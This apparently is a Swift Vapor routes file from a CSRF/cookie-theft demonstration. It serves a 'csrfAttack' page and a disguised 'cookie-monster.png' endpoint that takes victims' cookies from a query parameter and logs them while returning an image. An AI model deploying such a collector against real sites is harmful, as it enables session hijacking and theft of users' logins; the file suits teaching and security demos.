import Vapor

/// Register your application's routes here.
public func routes(_ router: Router) throws {
    router.get("csrfAttack") { req -> Future<View> in
        return try req.view().render("csrfAttack", CSRFAttackContext())
    }

    router.get("cookie-monster.png") { req -> Future<Response> in
        guard let cookies = req.query[String.self, at: "cookies"] else {
            throw Abort(.badRequest)
        }
        print("Cookies received: \(cookies)")

        let cookieImage = try req.make(DirectoryConfig.self).workDir + "cookie-monster.png"
        return try req.streamFile(at: cookieImage)
    }
}

struct CSRFAttackContext: Encodable {
    let title = "Homepage"
}
